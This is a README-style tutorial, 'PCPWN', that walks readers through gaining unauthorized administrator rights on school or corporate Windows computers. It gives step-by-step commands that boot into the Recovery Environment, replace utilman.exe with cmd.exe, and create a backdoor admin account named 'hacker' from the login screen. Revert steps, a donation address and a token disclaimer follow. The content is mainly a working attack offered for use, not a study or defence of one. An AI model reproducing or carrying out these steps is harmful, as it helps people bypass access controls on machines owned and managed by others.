
<p align="center">
<img src="https://cdn-icons-png.flaticon.com/512/207/207130.png", width="200", height="200">
</p>

<h1 align="center"> [ PCPWN ]</h1>
<h4 align="center">How can I obtain administrative privileges on a school computer
</h4>

### DESCRIPTION
PCPWN is an informative tutorial that guides you through the process of gaining unauthorized access to administrative privileges on a computer within a school or corporate environment, all without relying on the pre-existing company-created admin account.

### 1. Access Windows RE (Recovery Environment):
  Start by accessing recovery mode on the target system. [7 Quick Ways to Boot Into the Windows Recovery Environment](https://www.makeuseof.com/ways-to-boot-into-the-windows-recovery-environment/)
    
  #### When the computer is turned off:

        Press and hold the Windows Key and press the power button.
        Release both keys.

 #### From the Windows Logon screen:
        Click the Power Button icon.
        Hold the SHIFT Key and click Restart.


<table>
  <tr>
    <td align="center">
      <a href="#"><img src="https://i.imgur.com/NNXrJrk.png" width="300" /></a>
        <br />
      </a>
    </td>
    <td align="center">
      <a href="#"><img src="https://i.imgur.com/zbDdvEI.png" width="300" /></a>
        <br />
      </a>
    </td>
    <td align="center">
     <a href="#"><img src="https://i.imgur.com/R1Tg6vo.png" width="300" /></a>
        <br />
      </a>
    </td>
      <td align="center">
     <a href="#"><img src="https://i.imgur.com/DwzVX1G.png" width="300" /></a>
        <br />
      </a>
    </td>
      <td align="center">
     <a href="#"><img src="https://i.imgur.com/oDvOtPm.png" width="300" /></a>
        <br />
      </a>
    </td>
</table>

Search "recovery start-up" > click recovery start-up.

Click Restart Now button under the Advanced start-up section. The computer should restart and enter recovery mode.

then navigate to "Troubleshoot," click "Advanced option" and finally, select "Command Prompt."

### 2. Utilizing Command Prompt and Changing Utilman to CMD:
In the Command Prompt, type the following command:

    wmic logicaldisk get caption                        - List available drives
    c:                                                  - Change to the C: drive
    cd Windows\System32                                 - Navigate to the System32 folder
    ren utilman.exe utilman.exe.bak                     - Rename utilman.exe to utilman.exe.bak
    copy cmd.exe utilman.exe                            - Copy cmd.exe to utilman.exe
    exit                                                - exit the command prompt
    
### 4. Adding a User Account:
Return to the login screen and click on "Ease of Access Icon."

In the Command Prompt, type the following command:

    net user hacker hacker /add                         - Create a new user named "hacker" with password "hacker"
    net localgroup Administrators hacker /add           - Add the user "hacker" to the Administrators group

### 5. Logging In with the New Account with admin priv:
    Log in with your non-administrator account.
    Open PowerShell as an administrator.
    Type username: DOMAIN\hacker password: hacker

Guess what? You've got the keys to the kingdom now! Your regular account? Well, it's not so regular anymore. It's been upgraded to full-on admin mode. That means you're not just a regular user – you're the boss.

With these admin superpowers, you can do a whole bunch of cool stuff. Need to tweak some settings? No problem. Want to add or manage users? Easy peasy. It's like having a backstage pass to the entire system. So go ahead, explore, and make this digital world yours!

### TESTED ON FOLLOWING
* Windows 11
* Windows 10
* Windows 7


### Reverting Changes
To restore utilman.exe, in the Command Prompt type in:

    C:
    cd windows\system32
    del utilman.exe
    ren utilman.exe.bak utilman.exe

Then reboot the system.

## Support

If you find my work helpful and want to support me, consider making a donation. Your contribution will help me continue working on open-source projects.

**Bitcoin Address: `36ALguYpTgFF3RztL4h2uFb3cRMzQALAcm`**
   
<h1 align="center"> DISCLAIMER </h1>

<h4 align="center">I'm not responsible for anything you do with this tutorial, so please only use it for good and educational purposes. </h4>

